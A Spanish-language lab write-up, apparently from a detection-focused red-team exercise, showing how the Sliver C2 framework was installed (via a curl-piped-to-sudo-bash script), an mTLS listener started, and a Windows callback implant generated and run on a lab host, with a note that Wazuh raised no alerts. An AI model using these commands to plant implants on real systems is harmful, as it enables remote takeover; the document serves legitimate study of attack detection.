# Fase 2 · Acceso inicial y C2 con Sliver

## ¿Qué es Sliver?

Sliver es un framework de C2 (command and control) de código abierto, escrito en Go, mantenido por BishopFox. Es la alternativa gratuita a herramientas comerciales como Cobalt Strike, y se usa ampliamente en ejercicios de red team y pentesting legítimos.

Un C2 tiene dos piezas:

- **Listener**: el proceso que corre en la máquina del atacante, esperando a que un implante se conecte a él.
- **Implante**: el ejecutable que se genera para la máquina objetivo. Al ejecutarse, se conecta de vuelta al listener y abre una sesión de control remoto.

## Instalación en `atacante`

Sliver se instaló en la máquina `atacante` (Kali Linux) mediante el script oficial:

```bash
sudo apt update
curl https://sliver.sh/install | sudo bash
```

El `apt update` previo fue necesario porque el índice de paquetes estaba desactualizado y daba errores 404 al intentar resolver dependencias.

La instalación deja Sliver corriendo como servicio systemd (`sliver.service`), con un cliente (`sliver`) que se conecta al servidor usando un fichero de configuración de operador local. Para comprobar que el servicio está activo:

```bash
sudo systemctl status sliver
```

## Listener

Dentro de la consola de Sliver (`sliver`), se levantó un listener mTLS (mutual TLS, el canal cifrado por defecto de Sliver) en el puerto 8888:

```
mtls
```

Esto deja un job en segundo plano esperando conexiones entrantes de cualquier implante configurado para apuntar a `atacante:8888`.

## Generación del implante

El implante para Windows se generó con:

```
generate --mtls 192.168.100.30:8888 --os windows --arch amd64 --save ~/
```

- `--mtls <ip>:<puerto>`: a qué listener debe conectarse el implante al ejecutarse
- `--os windows --arch amd64`: plataforma objetivo (Windows 10 Pro de 64 bits, como `ws01`)
- `--save ~/`: directorio donde guardar el binario generado (se usó el directorio home del usuario para evitar problemas de permisos en `/root/`)

Cada implante generado tiene un nombre único y aleatorio (en este caso, `CLOUDY_ADVERTISEMENT.exe`), y el binario es distinto en cada compilación.

## Resultado

Una vez el binario llegó a `ws01` y se ejecutó, Sliver mostró la sesión abierta:

```
[*] Session 1b40debb CLOUDY_ADVERTISEMENT - 192.168.100.50:49708 (ws01) - windows/amd64 - Wed, 04 Nov 2026 18:20:48 CET
```

A partir de ahí, el comando `sessions` lista las sesiones activas, mostrando el host, el usuario (`CRISOL\Administrador`) y el sistema operativo de la máquina comprometida.

## Qué se detectó (y qué no)

El análisis de detección de este paso, con Wazuh como SIEM, está documentado por separado en [`reports/IR-001-ejecucion-implante-sliver.md`](../reports/IR-001-ejecucion-implante-sliver.md): en resumen, ni la ejecución del implante ni la conexión del canal C2 generaron alertas, por falta de telemetría de creación de procesos y de red en el agente de `ws01`.

## Nota metodológica

El paso de transferir el implante a `ws01` y ejecutarlo se hizo fuera de esta guía: el objetivo del proyecto es la fase de post-explotación y su detección, no simular el vector de entrega inicial (phishing, USB, ingeniería social, etc.), que queda fuera de alcance.
